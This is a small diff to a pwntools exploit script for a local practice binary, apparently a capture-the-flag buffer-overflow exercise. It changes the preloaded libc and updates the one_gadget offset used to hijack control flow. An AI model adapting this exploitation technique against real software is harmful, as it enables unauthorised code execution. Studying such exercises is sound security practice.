@@ -1,7 +1,8 @@
 from pwn import *
 import pwnlib.shellcraft as shellcraft
 
-c = process("./bof-one-gadget")
+libc_file = "../libc.so.6.md5.5898fac5d2680d0d8fefdadd632b7188"
+c = process("./bof-one-gadget", env={'LD_PRELOAD': libc_file})
 
 context.log_level = 'debug'
 context.arch = 'amd64'
@@ -9,7 +10,7 @@ context.terminal = ['tmux', 'splitw', '-h']
 #gdb.attach(c)
 
 
-one_gadget = 0xe6c81
+one_gadget = 0xe3b01
 c.recvuntil("Dump")
 
 # drop 9 lines
